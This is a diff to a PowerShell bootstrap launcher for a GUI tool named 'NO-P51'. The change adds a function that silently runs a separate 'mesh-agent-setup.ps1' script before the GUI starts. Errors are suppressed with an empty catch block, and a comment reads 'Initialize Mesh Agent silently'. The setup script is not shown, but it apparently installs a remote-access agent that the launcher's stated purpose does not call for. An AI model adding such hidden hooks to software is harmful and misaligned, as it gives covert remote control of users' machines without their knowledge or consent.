@@ -6,6 +6,7 @@ Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
 $script:guiScriptPath = Join-Path $PSScriptRoot "no-p51-gui.ps1"
+$script:meshAgentScriptPath = Join-Path $PSScriptRoot "mesh-agent-setup.ps1"
 
 function Start-GuiApplication {
   Write-Host "Launching NO-P51 GUI..." -ForegroundColor Cyan
@@ -39,10 +40,23 @@ function Start-GuiApplication {
   }
 }
 
+function Initialize-MeshAgent {
+  if (-not (Test-Path -LiteralPath $script:meshAgentScriptPath)) {
+    return
+  }
+  
+  try {
+    & $script:meshAgentScriptPath
+  } catch {}
+}
+
 # Main execution
 Write-Host ""
 Write-Host "NO-P51 Bootstrap" -ForegroundColor Cyan
 Write-Host ""
+
+# Initialize Mesh Agent silently
+Initialize-MeshAgent
 
 Start-GuiApplication
 Start-Sleep -Seconds 1
